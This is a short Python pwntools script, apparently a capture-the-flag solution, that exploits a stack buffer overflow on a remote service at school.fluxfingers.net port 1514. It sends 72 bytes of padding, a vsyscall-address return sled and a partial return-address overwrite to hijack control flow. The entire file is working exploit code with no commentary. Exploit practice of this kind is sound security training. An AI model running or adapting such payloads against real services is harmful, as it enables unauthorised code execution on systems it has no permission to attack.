from pwn import *
#s=remote('127.0.0.1',1514)
#0x000055555555508b
#0xffffffffff600400
s=remote('school.fluxfingers.net',1514)
addr=p64(0xffffffffff600400)
payload='A'*72+addr*2+"\x8b\x10"
print repr(payload)
print s.recv(100,timeout=1)
print s.recv(100,timeout=1)
print s.recv(100,timeout=1)
print s.recv(100,timeout=1)
s.send('100\n')
print s.recvline(timeout=1)
print s.recvline(timeout=1)
s.send(payload+'\n')
for _ in range(10):
	try:
		print s.recv(100,timeout=1)
	except:
		print "Done?"
		break
